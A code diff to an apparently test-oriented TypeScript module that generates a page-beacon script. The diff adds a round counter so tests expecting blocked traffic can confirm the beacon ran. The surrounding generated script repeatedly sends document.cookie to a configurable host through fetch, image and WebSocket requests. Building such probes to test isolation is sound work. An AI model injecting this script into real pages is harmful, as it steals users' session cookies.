@@ -30,15 +30,21 @@ export function validBeacon(beacon: PageBeacon): Required<PageBeacon> {
   return { host: beacon.host.toLowerCase(), port: beacon.port, intervalMs }
 }
 
+/** The attribute on `<html>` that counts the rounds the beacon has fired, as `data-beacon-rounds`. */
+export const BEACON_ROUNDS_ATTRIBUTE = 'data-beacon-rounds'
+
 /**
  * The script tag. Each round reads document.cookie afresh, so a cookie set after the page loaded
- * leaks too. Every route is wrapped, so one the browser refuses doesn't stop the others.
+ * leaks too. Every route is wrapped, so one the browser refuses doesn't stop the others. Each round
+ * then counts itself on `<html data-beacon-rounds>`, so a test that expects nothing to arrive can
+ * first check that the beacon really ran.
  */
 export function beaconScript(beacon: PageBeacon): string {
   const { host, port, intervalMs } = validBeacon(beacon)
   const authority = JSON.stringify(`//${host}:${port}`)
   return `<script id="page-beacon">(function () {
   var to = ${authority}
+  var rounds = 0
   var fire = function () {
     var leak = encodeURIComponent(document.cookie || 'no-cookie')
     var query = '/beacon?c=' + leak
@@ -47,6 +53,7 @@ export function beaconScript(beacon: PageBeacon): string {
     try { fetch('https:' + to + query, { mode: 'no-cors' }).catch(function () {}) } catch (e) {}
     try { new Image().src = 'http:' + to + query + '&img=1' } catch (e) {}
     try { var ws = new WebSocket('ws:' + to + '/ws?c=' + leak); ws.onerror = function () {} } catch (e) {}
+    try { document.documentElement.dataset.beaconRounds = String(++rounds) } catch (e) {}
   }
   fire()
   setInterval(fire, ${intervalMs})
